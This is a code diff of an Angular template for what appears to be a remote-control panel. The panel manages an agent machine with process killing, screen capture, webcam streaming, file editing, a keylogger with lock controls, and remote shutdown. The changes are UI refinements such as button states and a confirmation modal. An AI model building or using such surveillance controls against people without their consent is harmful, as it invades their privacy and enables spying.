@@ -8,20 +8,34 @@
     </div>
 <div class="agent-controls">
 
-  <div class="status-chip online">
-    ● ONLINE
-  </div>
+  <div
+  class="status-chip"
+  [class.online]="agent?.online"
+  [class.offline]="!agent?.online"
+>
+  ● {{ agent?.online ? 'ONLINE' : 'OFFLINE' }}
+</div>
 
-  <div class="status-chip ws">
-    WS: {{ ws.status() }}
-  </div>
+<div
+  class="status-chip ws"
+  [class.connected]="ws.status() === 'connected'"
+  [class.disconnected]="ws.status() !== 'connected'"
+>
+  WS: {{ ws.status() === 'connected' ? 'CONNECTED' : 'DISCONNECTED' }}
+</div>
 
   <button
-    class="btn-connect"
-    (click)="connectWS()"
-    [disabled]="!agent?.online || ws.status() === 'connected'">
-    🔌 CONNECT
-  </button>
+  class="btn-connect"
+  [class.connected]="ws.status() === 'connected'"
+  [class.disconnected]="ws.status() !== 'connected'"
+  (click)="toggleWS()"
+  [disabled]="!agent?.online"
+>
+  {{ ws.status() === 'connected'
+      ? '🔌 CONNECTED'
+      : '🔌 CONNECT' }}
+</button>
+
 
 </div>
 
@@ -58,7 +72,7 @@
       </div>
 
       <!-- MODULE CONTENT -->
-      <div class="module-content">
+      <div class="module-content"  [@moduleAnim]="selectedModule()">
          <!-- ========== PROCESS MANAGER ========== -->
 <div *ngIf="selectedModule() === 'PROCESSES'" class="section-card process">
 
@@ -78,12 +92,12 @@
     </div>
 
     <div class="command danger">
-      <input type="number" placeholder="PID…" [(ngModel)]="killPid">
+      <input type="number" placeholder="PID…" [(ngModel)]="killPid"(keyup.enter)="killProcess(killPid)">
       <button class="cmd-btn danger" (click)="killProcess(killPid)">🗑 KILL</button>
     </div>
 
     <div class="command">
-      <input type="text" placeholder="process.exe" [(ngModel)]="startExeName">
+      <input type="text" placeholder="process.exe" [(ngModel)]="startExeName"(keyup.enter)="startProcess()">
       <button class="cmd-btn" (click)="startProcess()">➕ START</button>
     </div>
 
@@ -137,12 +151,12 @@
     </div>
 
     <div class="command danger">
-      <input type="text" placeholder="app.exe" [(ngModel)]="killExeName">
+      <input type="text" placeholder="app.exe" [(ngModel)]="killExeName" (keyup.enter)="killApp(killExeName)">
       <button class="cmd-btn danger" (click)="killApp(killExeName)">🗑 KILL</button>
     </div>
 
     <div class="command">
-      <input type="text" placeholder="app.exe" [(ngModel)]="startExeName">
+      <input type="text" placeholder="app.exe" [(ngModel)]="startExeName" (keyup.enter)="sendAppStart()" >
       <button class="cmd-btn" (click)="sendAppStart()">➕ START</button>
     </div>
 
@@ -181,8 +195,8 @@
   <div class="module-header">
     <h3>🖼 SCREEN CAPTURE</h3>
     <div class="module-actions">
-      <button class="cmd-btn" (click)="sendScreenCaptureBinary()">📷 CAPTURE</button>
-      <button class="cmd-btn ghost" (click)="clearScreenshot()">CLEAR</button>
+      <button class="cmd-btn"  [class.loading]="screenBusy"(click)="sendScreenCaptureBinary()">📷 CAPTURE</button>
+      <button class="cmd-btn ghost"[disabled]="screenBusy" (click)="clearScreenshot()">CLEAR</button>
     </div>
   </div>
 
@@ -207,8 +221,8 @@
   <div class="module-header">
     <h3>📷 WEBCAM STREAM</h3>
     <div class="module-actions">
-      <button class="cmd-btn" (click)="sendWebcamStartStream()">▶ START</button>
-      <button class="cmd-btn danger" (click)="sendWebcamStopStream()">⏹ STOP & SAVE</button>
+      <button class="cmd-btn"  [class.loading]="webcamBusy"(click)="sendWebcamStartStream()">▶ START</button>
+      <button class="cmd-btn danger" [class.loading]="webcamBusy"(click)="sendWebcamStopStream()">⏹ STOP & SAVE</button>
     </div>
   </div>
 
@@ -244,7 +258,7 @@
   </div>
 
   <!-- PATH BAR -->
-  <div class="explorer-path">
+  <div class="explorer-path"  [class.path-active]="currentExplorerPath() && currentExplorerPath() !== 'ROOT'">
     <span>PATH</span>
     <code>{{ currentExplorerPath() || 'ROOT' }}</code>
   </div>
@@ -262,6 +276,14 @@
 
       <div class="item-name" title="{{ item.name }}">
         {{ item.name }}
+         <!-- EDITABLE BADGE -->
+    <span
+      *ngIf="isEditableFile(item)"
+      class="editable-badge"
+      title="Editable file (double click to open)"
+    >
+      ✏️ 
+    </span>
       </div>
     </div>
   </div>
@@ -281,9 +303,10 @@
 
 <div class="editor-modal" *ngIf="editorOpen()">
 
-  <div class="editor-header">
+  <div class="editor-header" [class.saved]="editorSavedFlash">
     <div class="editor-title">
       ✏️ Editing: {{ editorPath() }}
+      <span class="editor-hint">(Ctrl+S: save, Esc: out)</span>
     </div>
 
     <div class="editor-buttons">
@@ -310,27 +333,32 @@
 
     <div class="module-actions">
       <button class="cmd-btn green"
+               [disabled]="keyloggerRunning()"
               [class.active]="keyloggerRunning()"
               (click)="sendKeyloggerStart()">
         ▶ START
       </button>
 
       <button class="cmd-btn red"
+              [disabled]="!keyloggerRunning()"
               [class.active]="!keyloggerRunning()"
               (click)="sendKeyloggerStop()">
         ■ STOP
       </button>
 
-      <button class="cmd-btn"
-              [class.active]="keyloggerLocked()"
-              (click)="sendKeyloggerLock()">
-        🔒 LOCK
-      </button>
+     
 
       <button class="cmd-btn"
+              [disabled]="!keyloggerLocked()"
               [class.active]="!keyloggerLocked()"
               (click)="sendKeyloggerUnlock()">
         🔓 UNLOCK
+      </button>
+       <button class="cmd-btn red"
+              [disabled]="keyloggerLocked()"
+              [class.active]="keyloggerLocked()"
+              (click)="sendKeyloggerLock()">
+        🔒 LOCK
       </button>
 
       <button class="cmd-btn ghost" (click)="clearKeylogs()">🧹 CLEAR</button>
@@ -540,7 +568,7 @@
         </div>
       </div>
       <button class="system-btn danger"
-              (click)="sendSystemShutdown()">
+                (click)="openSystemConfirm('shutdown')">
         EXECUTE
       </button>
     </div>
@@ -555,7 +583,7 @@
         </div>
       </div>
       <button class="system-btn warning"
-              (click)="sendSystemRestart()">
+              (click)="openSystemConfirm('restart')">
         EXECUTE
       </button>
     </div>
@@ -563,6 +591,42 @@
   </div>
 
 </div>
+<!-- ========== SYSTEM CONFIRM MODAL ========== -->
+<div class="editor-backdrop" *ngIf="systemConfirmOpen"
+     (click)="closeSystemConfirm()"></div>
+
+<div class="system-confirm-modal" *ngIf="systemConfirmOpen">
+
+  <div class="confirm-header danger">
+    ⚠ CONFIRM ACTION
+  </div>
+
+  <div class="confirm-body">
+    <p>
+      Are you sure you want to
+      <b>{{ systemConfirmAction === 'shutdown' ? 'SHUT DOWN' : 'RESTART' }}</b>
+      the remote machine?
+    </p>
+
+    <p class="confirm-warning">
+      This action cannot be undone.
+    </p>
+  </div>
+
+  <div class="confirm-actions">
+    <button class="system-btn ghost"
+            (click)="closeSystemConfirm()">
+      CANCEL
+    </button>
+
+    <button class="system-btn danger"
+            (click)="confirmSystemAction()">
+      CONFIRM
+    </button>
+  </div>
+
+</div>
+
 
 
         <!-- Tất cả mấy khối PROCESS / APP / KEYLOGGER / SCREEN
